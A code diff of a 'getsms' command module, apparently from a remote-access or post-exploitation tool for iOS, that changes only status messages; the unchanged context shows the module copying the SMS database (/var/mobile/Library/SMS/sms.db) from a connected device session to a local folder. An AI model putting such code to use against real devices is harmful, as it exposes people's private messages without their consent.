@@ -25,7 +25,7 @@ import core.helper as h
 class command:
 	def __init__(self):
 		self.name = "getsms"
-		self.description = "Download SMS data."
+		self.description = "Get device SMS."
 
 	def run(self,session,cmd_data):
 		if len(cmd_data['args'].split()) < 1:
@@ -35,7 +35,7 @@ class command:
 		dest = cmd_data['args'].split()[0]
                 if os.path.isdir(dest):
                     if os.path.exists(dest):
-			 h.info_general("Downloading SMS...")
+			 h.info_general("Getting SMS...")
 			 data = session.download_file('/var/mobile/Library/SMS/sms.db')
 			 if data:
 			     f = open(os.path.join(dest,'sms.db'),'w')
@@ -57,7 +57,7 @@ class command:
 			if os.path.isdir(rp):
 			    pr = os.path.split(dest)[0]
                             rp = os.path.split(dest)[1]
-                            h.info_general("Downloading SMS...")
+                            h.info_general("Getting SMS...")
 			    data = session.download_file('/var/mobile/Library/SMS/sms.db')
 			    if data:
 			        f = open(os.path.join(pr,rp),'w')
